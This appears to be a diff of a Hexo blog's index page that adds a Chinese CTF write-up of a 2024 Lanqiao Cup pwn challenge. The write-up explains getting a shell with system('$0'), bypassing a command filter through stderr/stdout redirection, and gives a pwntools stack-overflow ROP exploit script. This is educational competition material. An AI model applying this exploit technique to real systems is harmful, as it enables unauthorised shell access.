@@ -116,7 +116,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 10px;">C语言</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/pwn/" style="font-size: 16.67px;">pwn</a> <a href="/tags/pwn%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">pwn工具</a> <a href="/tags/pwn%E9%A2%98%E8%A7%A3/" style="font-size: 13.33px;">pwn题解</a> <a href="/tags/%E5%91%A8%E6%8A%A5/" style="font-size: 20px;">周报</a> <a href="/tags/%E5%A0%86/" style="font-size: 10px;">堆</a> <a href="/tags/%E6%90%AD%E5%8D%9A%E5%AE%A2/" style="font-size: 10px;">搭博客</a>
+						<a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 10px;">C语言</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/pwn/" style="font-size: 16.67px;">pwn</a> <a href="/tags/pwn%E5%A7%BF%E5%8A%BF/" style="font-size: 10px;">pwn姿势</a> <a href="/tags/pwn%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">pwn工具</a> <a href="/tags/pwn%E9%A2%98%E8%A7%A3/" style="font-size: 13.33px;">pwn题解</a> <a href="/tags/%E5%91%A8%E6%8A%A5/" style="font-size: 20px;">周报</a> <a href="/tags/%E5%A0%86/" style="font-size: 10px;">堆</a> <a href="/tags/%E6%90%AD%E5%8D%9A%E5%AE%A2/" style="font-size: 10px;">搭博客</a>
 					</div>
 				</section>
 				
@@ -227,6 +227,127 @@
       
 	<div class="article-category tagcloud">
 	<a class="article-category-link" href="/categories/%E5%91%A8%E6%8A%A5/">周报</a>
+	</div>
+
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-shell的获取，输出重定向he例题" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/" class="article-date">
+  	<time datetime="2024-04-28T12:11:01.000Z" itemprop="datePublished">2024-04-28</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/">
+        shell的获取，输出重定向he例题
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>昨天学长在打完蓝桥杯后将其中的pwn题的一道给了我，让我整整，不算难，不过其中有的关于拿到shell的获取flag的姿势还是比较特殊的，属于不难但是比较偏的考点，确实我在做的时候并没有做出来，后来在学长的提醒与上网查资料下才知道的考点，故写一写这篇文章记录一下新学到的这个骚姿势。</p>
+<p><strong>关于shell的获取</strong></p>
+<p>在pwn题中出了那些上了沙箱的题目不能直接拿到shell外，其他的题主要目的便是拿到远程服务器的shell用以读取flag的值，因此shell的获取成为关键的一步，除去ret2dlresolve和SROP这种特殊方法拿到shell外，用system函数几乎是主要的方法</p>
+<ol>
+<li><code>system(/bin/sh)</code></li>
+<li><code>system(sh)</code></li>
+<li><code>system($0)</code></li>
+</ol>
+<p>以上这3种基本就是通过system函数执行参数拿到shell的方法。这里$0就这道要用到拿到shell的方法。</p>
+<p>这3种方法主要以&#x2F;bin&#x2F;sh用的最多，这个参数在程序中可以通过libc的地址找到，sh则一般在程序中独立有的情况下才用。$0这更少只在特殊的题才会用到。</p>
+<p><strong>输出重定向</strong></p>
+<p>在shell命令中有一种叫Shell 输入&#x2F;输出重定向的规则，</p>
+<p>我的理解便是在shell的交互过程中，通过一些命令的作用将其不再往常一样从屏幕上输入，并向屏幕上输出。</p>
+<p>简单的就像将输入的过程重定向到某个文件中，那么shell便会将文件中的内容当命令一行一行的执行，而输出重定向则相反，通过将输出的过程重定向到某个文件，从而使shell将命令执行后的结果输出到该文件中，不再屏幕上输出。</p>
+<p>看起来这个似乎与我们的拿取flag的内容关系不大，但在有的题目中出题人为了恶心人，会将有的字母标记为不可执行的字母，或者在命令中出现这些字母便不能执行，会报错不能达到命令的既定效果。就像蓝桥杯的这道题。在程序中便禁止<code>cat</code>的同时出现与<code>b，s，/，i，n</code>这几个字符的出现。</p>
+<p>那我们输入的命令真的就不能执行吗，其实也一不一定，像将某些东西输出到屏幕上的命令如cat等其实程序是执行的不过在输出结果是，因为有之前的报错在，程序便不会再将命令的执行效果输入到屏幕上，而是将报错的内容输出到屏幕上。既然如此，那我们有没有办法将程序执行结果的覆盖报错的结果并输出到屏幕上呢（前提这个命令在没有限制的前提下是能执行有结果的），这种办法便是输入重定向。</p>
+<p>在了解这种方法之前我们还需要知道宁外一个知识点，<em>文件描述符</em>（fd）</p>
+<p>这个文件描述符通常有数字表示</p>
+<ul>
+<li><code>0</code> 代表标准输入（stdin）。</li>
+<li><code>1</code> 代表标准输出（stdout）。</li>
+<li><code>2</code> 代表标准错误输出（stderr）。</li>
+</ul>
+<p>0代表输入，1代表输入（正确的结果），2代表报错的内容输出</p>
+<p>既然知道这个了便可以想想在之前的重定向中输入的过程便是文件描述符中的0，正确执行结果的输出便是1，报错内容的输出便是2，那在重定向的过程中如果我们能将1的输出重定向成2，那便是将正确的结果替换成报错的结果被程序当做应该输入到屏幕上的内容输入到屏幕上。（好像有点绕，不够多看几遍应该能理解吧）</p>
+<p>这个命令是什么呢，就是<strong>2&gt;&amp;1</strong>这个</p>
+<p>在命令中，<code>2&gt;&amp;1</code> 是用来重定向标准错误（stderr）到标准输出（stdout）的。</p>
+<ul>
+<li><code>2</code> 代表标准错误（stderr）。</li>
+<li><code>1</code> 代表标准输出（stdout）。</li>
+<li><code>&gt;</code> 是重定向操作符。</li>
+<li><code>&amp;</code> 表示我们是在重定向一个文件描述符（在这种情况下是标准错误），而不是创建一个名为<code>&amp;1</code>的文件。</li>
+</ul>
+<p>因此，<code>2&gt;&amp;1</code> 说的是：“将标准错误（文件描述符2）重定向到与标准输出（文件描述符1）相同的地方。”</p>
+<p><code>1&gt;&amp;2</code> 说的是：“将标准输出（文件描述符1）重定向到与标准错误（文件描述符2）相同的地方</p>
+<p>就这样便可以完美避过在程序中对我们命令的检查，从而执行我们想要的命令并获得想要的结果。</p>
+<p>关于这个命令的使用，很简单，就加再正常命令的后面，如</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag <span class="number">1</span>&gt;&amp;<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>直接这样用便是可以的了。具体的我们以下面这道例题分析。</p>
+<p>2024蓝桥杯的pwn题，先checksec一下</p>
+<p><img src="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240428212948696.png" alt="image-20240428212948696"></p>
+<p>没什么保护，并且这道题没有给libc版本说明这道题不用去泄露libc的地址也是能做的，不考虑环境问题。</p>
+<p>来看主函数</p>
+<p><img src="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240428213213551.png" alt="image-20240428213213551"></p>
+<p>init函数只是在释放缓冲区并没有什么用，不用管，可以看到程序先是向info中读入0xe长度的数据，并且这个info不是栈的变量而是一个bss段的空间，故我们想info中读取的数据存放在哪我们是知道并且可以利用的，后面便是一个栈溢出的漏洞，虽然能溢出的大小不算太大但也不小，足够执行一些命令了，然后便是来到check函数这</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl check()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned <span class="built_in">int</span> i; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xD</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info[i] == <span class="string">&#x27;c&#x27;</span> &amp;&amp; info[i + <span class="number">1</span>] == <span class="string">&#x27;a&#x27;</span> &amp;&amp; info[i + <span class="number">2</span>] == <span class="string">&#x27;t&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;Do not use `cat` command.&quot;</span>);</span><br><span class="line">      exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( info[i] == <span class="string">&#x27;b&#x27;</span> || info[i] == <span class="string">&#x27;s&#x27;</span> || info[i] == <span class="string">&#x27;/&#x27;</span> || info[i] == <span class="string">&#x27;i&#x27;</span> || info[i] == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;Do not use some other characters.&quot;</span>);</span><br><span class="line">      exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> close(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里便是其内容，简单来说便是对输入到info中的数据进行检测，使其中不能有连续的<code>cat</code>出现和<code>b，s，/，i，n</code>这几个字符的单独出现。这里看似只是检测info中的数据但是在拿到shell后会发现这个检测对向shell中输入的命令也是存在的（这已经是后话了目前主要先拿到shell）</p>
+<p>在回到main函数中，仔细看这个程序会发现在程序中其实是有后门函数的</p>
+<p><img src="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240428214648408.png" alt="image-20240428214648408"></p>
+<p>有system函数，不过其中的参数没什么有，不过既然有这个函数那便可以调用这个函数，那现在我们便只用解决参数的问题然后便可以调用system函数从而获得shell，</p>
+<p>在一开始时程序可想info的地方输入数据，并且这个info的地址还是已知的存在，不过在后面的检查中不能有连续的<code>cat</code>出现和<code>b，s，/，i，n</code>这几个字符的单独出现，那拿到shell的前两种方法便已经没用了，还有一种$0似乎可以，先向info中输入$0，然后在栈溢出中将info的地址赋值给rdi寄存器，然后调用system函数从而执行<code>system（$0）</code>命令获得shell。<br>exp如下</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x4008a1&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#io.sendafter(&#x27;stack.\n&#x27;,b&#x27;ca\\t flag 1&gt;&amp;2&#x27;)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;stack.\n&#x27;</span>,<span class="string">b&#x27;$0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">info=<span class="number">0x601090</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400933</span></span><br><span class="line">system=<span class="number">0x4005D0</span></span><br><span class="line">ret=<span class="number">0x00000000004005ae</span></span><br><span class="line"></span><br><span class="line">printf=<span class="number">0x4008A1</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi_ret)+p64(info)+p64(ret)+p64(system)</span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span>,<span class="string">b&quot;A&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;...\n&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#static-sh ./flag</span></span><br><span class="line"><span class="comment">#exec 1&gt;&amp;2   cat flag</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>好像这样执行拿到shell就大工告急了，but，</p>
+<p><img src="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240428220239242.png" alt="image-20240428220239242"></p>
+<p>在shell执行命令后会发现之前checksec函数的检测还在，那现在的问题就在与如何将这个检测绕过了，</p>
+<p>其实答案就在上面知识点的那个输出重定向，便可以完美解决这里的问题，</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn%E5%A7%BF%E5%8A%BF/" rel="tag">pwn姿势</a></li></ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/pwn/">pwn</a>
 	</div>
 
 
@@ -2300,7 +2421,7 @@
 
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 <p><img src="/2024/03/26/hello-world/002917-16858097570092.jpg" alt="002917-16858097570092"></p>
-<p>INFO  Copying files from extend dirs…<br>On branch master<br>nothing to commit, working tree clean<br>Everything up-to-date<br>branch ‘master’ set up to track ‘<a href="mailto:&#103;&#105;&#x74;&#64;&#103;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;">&#103;&#105;&#x74;&#64;&#103;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;</a>:2023478&#x2F;2023478.github.io.git&#x2F;main’.<br>INFO  Deploy done: git</p>
+<p>INFO  Copying files from extend dirs…<br>On branch master<br>nothing to commit, working tree clean<br>Everything up-to-date<br>branch ‘master’ set up to track ‘<a href="mailto:&#103;&#x69;&#116;&#x40;&#x67;&#105;&#x74;&#x68;&#117;&#98;&#46;&#x63;&#111;&#109;">&#103;&#x69;&#116;&#x40;&#x67;&#105;&#x74;&#x68;&#117;&#98;&#46;&#x63;&#111;&#109;</a>:2023478&#x2F;2023478.github.io.git&#x2F;main’.<br>INFO  Deploy done: git</p>
 
       
     </div>
